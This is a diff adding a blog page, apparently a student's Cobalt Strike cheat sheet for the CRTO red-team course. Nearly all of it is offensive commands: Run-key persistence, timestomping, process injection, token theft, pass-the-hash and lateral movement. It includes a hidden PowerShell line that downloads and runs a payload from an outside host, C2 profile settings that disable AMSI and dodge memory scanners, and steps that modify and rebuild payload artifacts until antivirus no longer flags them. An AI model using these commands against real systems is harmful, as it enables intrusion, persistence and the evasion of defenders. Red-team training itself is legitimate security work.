@@ -1,0 +1,1535 @@
+<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Zero-Point Security Red Team Operator CRTO Commands CheatSheet" /><meta name="author" content="ItsFadinG" /><meta property="og:locale" content="en_US" /><meta name="description" content="Introduction" /><meta property="og:description" content="Introduction" /><link rel="canonical" href="https://itsfading.github.io/posts/Red-Team-Operator-CRTO-Commands-CheatSheet/" /><meta property="og:url" content="https://itsfading.github.io/posts/Red-Team-Operator-CRTO-Commands-CheatSheet/" /><meta property="og:site_name" content="וֹtsƒα∂ιη𝔊" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2026-02-14T13:40:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Zero-Point Security Red Team Operator CRTO Commands CheatSheet" /><meta name="twitter:site" content="@ItsFadinG_" /><meta name="twitter:creator" content="@ItsFadinG" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"ItsFadinG"},"dateModified":"2026-04-18T15:15:52+02:00","datePublished":"2026-02-14T13:40:00+02:00","description":"Introduction","headline":"Zero-Point Security Red Team Operator CRTO Commands CheatSheet","mainEntityOfPage":{"@type":"WebPage","@id":"https://itsfading.github.io/posts/Red-Team-Operator-CRTO-Commands-CheatSheet/"},"url":"https://itsfading.github.io/posts/Red-Team-Operator-CRTO-Commands-CheatSheet/"}</script><title>Zero-Point Security | Red Team Operator CRTO Commands CheatSheet | וֹtsƒα∂ιη𝔊</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="וֹtsƒα∂ιη𝔊"><meta name="application-name" content="וֹtsƒα∂ιη𝔊"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/pal-avatar2.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">וֹtsƒα∂ιη𝔊</a></div><div class="site-subtitle font-italic">CyberSecurity geek, who wants to share his day-to-day knowledge</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://twitter.com/ItsFadinG_" aria-label="twitter" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/muhammadadel14" aria-label="linkedin" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://github.com/ItsFadinG" aria-label="github" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['Muhammad.adel.tr','gmail.com'].join('@')" aria-label="email" class="order-6" > <i class="fas fa-envelope"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Zero-Point Security | Red Team Operator CRTO Commands CheatSheet</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-9"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Zero-Point Security | Red Team Operator CRTO Commands CheatSheet</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> ItsFadinG </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Feb 14, 2026, 1:40 PM +0200" prep="on" > Feb 14 <i class="unloaded">2026-02-14T13:40:00+02:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Apr 18, 2026, 3:15 PM +0200" prefix="Updated " > Apr 18 <i class="unloaded">2026-04-18T15:15:52+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="6327 words">35 min</span></div></div><div class="post-content"><h2 id="introduction"><strong>Introduction</strong></h2><p>Peace be upon all of you. I recently completed the Red Team Operator course (CRTO) from Zero-Point Security, created by Daniel Duggan, and honestly, I truly loved the whole experience. The course is extremely well-structured, very informative, and clearly designed with a focus on the OPSEC considerations behind every step. Most of the material is delivered in written format, which I personally found excellent for deep understanding and note-taking, and each module is followed by video walkthroughs for the lab solutions.</p><p>The exam itself was very challenging at least for me — I failed my first two attempts. But Alhamdulillah, on the third attempt, I finally passed with full points. It was a tough journey, but definitely worth it.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/crto/results.png" alt="CRTO Exam Result" /></p><blockquote><p><strong>Disclaimer</strong> This Cheatsheet is simply a quick reference for the commands and techniques covered throughout the course. All the information shared here is directly related to the course material and is not my own original content.</p></blockquote><h2 id="cobaltstrike"><strong>CobaltStrike</strong></h2><h3 id="beacon-commands"><strong>beacon Commands</strong></h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+</pre><td class="rouge-code"><pre><span class="c"># Misc</span><span class="w">
+</span><span class="n">help</span><span class="w">
+</span><span class="c">## Registries</span><span class="w">
+</span><span class="n">reg_set</span><span class="w"> </span><span class="nx">HKCU</span><span class="w"> </span><span class="nx">Software\Microsoft\Windows\CurrentVersion\Run</span><span class="w"> </span><span class="nx">Updater</span><span class="w"> </span><span class="nx">REG_EXPAND_SZ</span><span class="w"> </span><span class="o">%</span><span class="nx">LOCALAPPDATA</span><span class="o">%</span><span class="nx">\Microsoft\WindowsApps\updater.exe</span><span class="w">
+</span><span class="n">reg_query</span><span class="w"> </span><span class="nx">HKCU</span><span class="w"> </span><span class="nx">Software\Microsoft\Windows\CurrentVersion\Run</span><span class="w"> </span><span class="nx">Updater</span><span class="w">
+</span><span class="c">## Schedule tasks</span><span class="w">
+</span><span class="n">schtaskscreate</span><span class="w"> </span><span class="nx">\Beacon</span><span class="w"> </span><span class="nx">XML</span><span class="w"> </span><span class="nx">CREATE</span><span class="w">
+</span><span class="n">schtasksdelete</span><span class="w">
+</span><span class="c">## Tamper the timestamp of a file, by applying another file's timestamp.</span><span class="w">
+</span><span class="n">timestomp</span><span class="w"> </span><span class="p">[</span><span class="n">fileA</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">fileB</span><span class="p">]</span><span class="w">
+</span><span class="c">## Inject a VNC server on the beacon process and get a remote desktop view of the target.</span><span class="w">
+</span><span class="n">desktop</span><span class="w"> </span><span class="p">[</span><span class="n">pid</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">x86</span><span class="o">|</span><span class="n">x64</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">high</span><span class="o">|</span><span class="n">low</span><span class="p">]</span><span class="w">
+</span><span class="n">desktop</span><span class="w"> </span><span class="nx">592</span><span class="w"> </span><span class="nx">x64</span><span class="w"> </span><span class="nx">high</span><span class="w">
+
+</span><span class="c"># Beacon</span><span class="w">
+</span><span class="n">sleep</span><span class="w">
+</span><span class="c">## Execute OS commands using Win32 API calls</span><span class="w">
+</span><span class="n">run</span><span class="w">
+</span><span class="c">## Execute OS commands by spawning "cmd.exe /c"</span><span class="w">
+</span><span class="n">shell</span><span class="w">
+</span><span class="c">## Execute commands by spawning "powershell.exe"</span><span class="w">
+</span><span class="n">powershell</span><span class="w">
+</span><span class="c">## Import a local powershell module in the current beacon process.</span><span class="w">
+</span><span class="n">powershell-import</span><span class="w">
+</span><span class="c">## powershell commands without spawning "powershell.exe", using only .net libraries and assemblies</span><span class="w">
+</span><span class="n">powerpick</span><span class="w">
+</span><span class="c">## Loads and executes a .NET compiled assembly executable completely on memory</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="p">[</span><span class="n">/path/to/local/.NET</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">arguments</span><span class="p">]</span><span class="w">
+</span><span class="c">## Run a Beacon Object File whic is a  C program, compiled as an object file, written to use conventions specified in CS docs</span><span class="w">
+</span><span class="n">inline</span><span class="nt">-execute</span><span class="w">
+</span><span class="c">## inject the unmanaged DLL into an existing process rather than spawning a new one</span><span class="w">
+</span><span class="n">psinject</span><span class="w"> </span><span class="mi">3020</span><span class="w"> </span><span class="n">x64</span><span class="w"> </span><span class="p">[</span><span class="n">psid</span><span class="p">]</span><span class="w">
+</span><span class="c">## List the running jobs of beacon</span><span class="w">
+</span><span class="n">jobs</span><span class="w">
+</span><span class="n">jobkill</span><span class="w"> </span><span class="p">[</span><span class="n">jobid</span><span class="p">]</span><span class="w">
+</span><span class="c">## Clears beacon queue</span><span class="w">
+</span><span class="n">clear</span><span class="w">
+
+</span><span class="c"># Session Passing</span><span class="w">
+</span><span class="c">## Spawn a new beacon on the current machine, you can choose any type of listener you want</span><span class="w">
+</span><span class="n">spawn</span><span class="w"> </span><span class="p">[</span><span class="n">x86</span><span class="o">|</span><span class="n">x64</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">listener</span><span class="p">]</span><span class="w">
+</span><span class="n">spawnas</span><span class="w"> </span><span class="p">[</span><span class="n">DOMAIN\user</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">password</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">listener</span><span class="p">]</span><span class="w">
+</span><span class="c">## Inject a beacon payload on a specified process and spawn a new beacon session under it's security context.</span><span class="w">
+</span><span class="n">inject</span><span class="w"> </span><span class="p">[</span><span class="n">pid</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">x86</span><span class="o">|</span><span class="n">x64</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">listener</span><span class="p">]</span><span class="w">
+</span><span class="n">inject</span><span class="w"> </span><span class="mi">9942</span><span class="w"> </span><span class="n">x64</span><span class="w"> </span><span class="n">Lab</span><span class="nt">-SMB</span><span class="w">
+
+</span><span class="c"># Lateral Movement</span><span class="w">
+</span><span class="c">## A wrapper of runas.exe, using credentials you can run a command as another user</span><span class="w">
+</span><span class="n">runas</span><span class="w"> </span><span class="p">[</span><span class="n">DOMAIN\user</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">password</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">command</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">arguments</span><span class="p">]</span><span class="w">
+</span><span class="n">runas</span><span class="w"> </span><span class="n">CORP\Administrator</span><span class="w"> </span><span class="nx">securePassword12</span><span class="o">!</span><span class="w"> </span><span class="nx">Powershell.exe</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-w</span><span class="w"> </span><span class="nx">hidden</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"IEX ((new-object net.webclient).downloadstring('http://192.168.50.90:80/filename'))"</span><span class="w">
+</span><span class="c">## providing credentials you can create an impersonation token into the current process and execute commands from the context of the impersonated user</span><span class="w">
+</span><span class="n">make_token</span><span class="w"> 
+</span><span class="c">## Steal a token from a specified process.</span><span class="w">
+</span><span class="n">steal_token</span><span class="w">
+</span><span class="c">## move lateraly using winrm or psexec to spawn a new beacon session on a target.</span><span class="w">
+</span><span class="n">jump</span><span class="w"> </span><span class="p">[</span><span class="n">psexec64</span><span class="p">,</span><span class="n">psexec</span><span class="p">,</span><span class="n">psexec_psh</span><span class="p">,</span><span class="n">winrm64</span><span class="p">,</span><span class="n">winrm</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">server/workstation</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">listener</span><span class="p">]</span><span class="w">
+</span><span class="c">## Execute a command on a remote target using psexec, winrm or wmi.</span><span class="w">
+</span><span class="n">remote</span><span class="nt">-exec</span><span class="w"> </span><span class="p">[</span><span class="n">method</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">target</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">command</span><span class="p">]</span><span class="w">
+</span><span class="c">## Pass The Hash attack and inject a TGT on the current process</span><span class="w">
+</span><span class="n">pth</span><span class="w"> </span><span class="p">[</span><span class="n">DOMAIN\user</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">hash</span><span class="p">]</span><span class="w">
+</span><span class="c">## Port Scanning</span><span class="w">
+</span><span class="n">portscan</span><span class="w"> </span><span class="p">[</span><span class="n">ip</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">ip</span><span class="w"> </span><span class="n">range</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">ports</span><span class="p">]</span><span class="w">
+</span><span class="n">portscan</span><span class="w"> </span><span class="mf">172.16</span><span class="o">.</span><span class="nf">48</span><span class="o">.</span><span class="nf">0</span><span class="n">/24</span><span class="w"> </span><span class="nx">1-2048</span><span class="p">,</span><span class="nx">3000</span><span class="p">,</span><span class="nx">8080</span><span class="w">
+</span></pre></table></code></div></div><h2 id="defense-evasion"><strong>Defense Evasion</strong></h2><h3 id="c2-profile"><strong>C2 Profile</strong></h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+</pre><td class="rouge-code"><pre><span class="c"># Team Server</span>
+ssh attacker@10.0.0.5
+
+<span class="c"># Change default.profile as needed</span>
+<span class="nb">cd</span> /opt/cobaltstrike/profiles<span class="p">;</span><span class="nb">rm </span>default.profile<span class="p">;</span>nano default.profile
+
+<span class="c"># Sample of Profile Optioons</span>
+stage <span class="o">{</span>
+    <span class="c">## Prevents Beacon from allocating memory pages that are both writable and executable at the same time</span>
+    <span class="nb">set </span>userwx <span class="s2">"false"</span><span class="p">;</span>
+    <span class="c">## Module stomping loads a legitimate DLL into memory and then overwrites its code with Beacon’s payload, so execution appears to be from a trusted Windows module</span>
+    <span class="nb">set </span>module_x64 <span class="s2">"Hydrogen.dll"</span><span class="p">;</span>
+    <span class="c">## Avoids copying the PE header into memory, which helps evade memory scanners that look for recognizable PE structures</span>
+    <span class="nb">set </span>copy_pe_header <span class="s2">"false"</span><span class="p">;</span>
+    <span class="c">## Free memory associated with reflective loader after it has been loaded</span>
+    <span class="nb">set </span>cleanup <span class="s2">"true"</span><span class="p">;</span> 
+    <span class="c">## Load Beacon into memory without its DLL headers</span>
+    <span class="nb">set </span>obfuscate <span class="s2">"true"</span><span class="p">;</span> 
+<span class="o">}</span>
+
+<span class="c"># Post-Exploitation Fork &amp; Run</span>
+<span class="c">## Proccess Injection Methods from Top to bottom</span>
+process-inject <span class="o">{</span>
+  execute <span class="o">{</span>
+      NtQueueApcThread-s<span class="p">;</span>
+      NtQueueApcThread<span class="p">;</span>
+      SetThreadContext<span class="p">;</span>
+      RtlCreateUserThread<span class="p">;</span>
+      CreateThread<span class="p">;</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+<span class="c">## post-ex Change pipe name - Parent-Child Process - AMSI - - Replace Strings in DLL  </span>
+post-ex <span class="o">{</span>
+   <span class="c">## Change pipe name</span>
+   <span class="nb">set </span>pipename <span class="s2">"dotnet-diagnostic-#####, ########-####-####-####-############"</span><span class="p">;</span>
+   <span class="c">## change the default spawn-to process from rundll32</span>
+   <span class="nb">set </span>spawnto_x86 <span class="s2">"%windir%</span><span class="se">\\</span><span class="s2">syswow64</span><span class="se">\\</span><span class="s2">svchost.exe"</span><span class="p">;</span> 
+   <span class="nb">set </span>spawnto_x64 <span class="s2">"%windir%</span><span class="se">\\</span><span class="s2">sysnative</span><span class="se">\\</span><span class="s2">svchost.exe"</span><span class="p">;</span>
+   <span class="c">## patch the AMSI DLL in-memory before executing the script</span>
+   <span class="nb">set </span>amsi_disable <span class="s2">"true"</span><span class="p">;</span>
+   <span class="c">## scrambles the content of the post-ex DLLs and settles the post-ex capability into memory</span>
+   <span class="nb">set </span>obfuscate <span class="s2">"true"</span><span class="p">;</span>
+   <span class="c">## frees the post-ex reflective loader from memory after the post-ex DLL is loaded</span>
+   <span class="nb">set </span>cleanup <span class="s2">"true"</span><span class="p">;</span>
+   <span class="c">## lets Beacon hand the DLL all the Windows functions it needs in advance, so the DLL doesn’t have to look them up itself</span>
+   <span class="nb">set </span>smartinject <span class="s2">"true"</span><span class="p">;</span>
+  
+  <span class="c">## rewrite known Cobalt Strike strings inside post-exploitation DLLs so they no longer match common detection signature</span>
+  transform-x64 <span class="o">{</span>
+      strrep <span class="s2">"ReflectiveLoader"</span> <span class="s2">"NetlogonMain"</span><span class="p">;</span>
+      strrepex <span class="s2">"ExecuteAssembly"</span> <span class="s2">"Invoke_3 on EntryPoint failed."</span> <span class="s2">"Assembly threw an exception"</span><span class="p">;</span>
+      strrepex <span class="s2">"PowerPick"</span> <span class="s2">"PowerShellRunner"</span> <span class="s2">"PowerShellEngine"</span><span class="p">;</span>
+<span class="o">}</span>
+
+<span class="c"># Restart the team server and see logs</span>
+<span class="nb">sudo</span> /usr/bin/docker restart cobaltstrike-cs-1
+<span class="nb">sudo</span> /usr/bin/docker logs cobaltstrike-cs-1 
+</pre></table></code></div></div><h3 id="cobalt-strike-kits"><strong>Cobalt Strike Kits</strong></h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+</pre><td class="rouge-code"><pre><span class="c"># Artifact Kit</span><span class="w">
+</span><span class="n">code</span><span class="w"> </span><span class="nx">C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\src-common\</span><span class="w">
+</span><span class="n">cd</span><span class="w"> </span><span class="nx">/mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact</span><span class="w">
+</span><span class="o">.</span><span class="n">/build</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">techniques</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">allocator</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">stage</span><span class="w"> </span><span class="nx">size</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">rdll</span><span class="w"> </span><span class="nx">size</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">include</span><span class="w"> </span><span class="nx">resource</span><span class="w"> </span><span class="nx">file</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">stack</span><span class="w"> </span><span class="nx">spoof</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">syscalls</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">output</span><span class="w"> </span><span class="nx">directory</span><span class="err">&gt;</span><span class="w">
+</span><span class="o">.</span><span class="n">/build.sh</span><span class="w"> </span><span class="nx">mailslot</span><span class="w"> </span><span class="nx">VirtualAlloc</span><span class="w"> </span><span class="nx">351366</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">false</span><span class="w"> </span><span class="nx">false</span><span class="w"> </span><span class="nx">none</span><span class="w"> </span><span class="nx">/mnt/c/Tools/cobaltstrike/custom-artifacts</span><span class="w">
+</span><span class="c">## Change L45:47</span><span class="w">
+</span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">length</span><span class="p">;</span><span class="w">
+</span><span class="kr">while</span><span class="p">(</span><span class="n">x--</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+  </span><span class="o">*</span><span class="p">((</span><span class="n">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="nx">buffer</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">((</span><span class="n">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="nx">buffer</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="err">^</span><span class="w"> </span><span class="nx">key</span><span class="p">[</span><span class="n">x</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">8</span><span class="p">];</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span><span class="c">## Change L115-117</span><span class="w">
+</span><span class="n">int</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">length</span><span class="p">;</span><span class="w">
+</span><span class="n">while</span><span class="p">(</span><span class="n">x--</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+   </span><span class="o">*</span><span class="p">((</span><span class="n">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">x</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">((</span><span class="n">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">x</span><span class="p">)</span><span class="w"> </span><span class="err">^</span><span class="w"> </span><span class="nx">key</span><span class="p">[</span><span class="n">x</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">8</span><span class="p">];</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span><span class="c">## Identify the detected part using Ghidra then modify and rebuild the c code again</span><span class="w">
+</span><span class="n">C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="o">.</span><span class="nx">\artifact64big.exe</span><span class="w">
+
+</span><span class="c"># Resource Kit</span><span class="w">
+</span><span class="n">cd</span><span class="w"> </span><span class="n">/mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource</span><span class="w">
+</span><span class="o">.</span><span class="nx">/build.sh</span><span class="w"> </span><span class="nx">/mnt/c/Tools/cobaltstrike/custom-resources</span><span class="w">
+</span><span class="n">code</span><span class="w"> </span><span class="n">C:\Tools\cobaltstrike\custom-resources\</span><span class="w">
+</span><span class="nx">C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="o">.</span><span class="nx">\template.x64.ps1</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">amsi</span><span class="w">
+
+</span><span class="c">## Compress.ps1</span><span class="w">
+</span><span class="c">### use Invoke-Obfuscation to hide amsi detected code</span><span class="w">
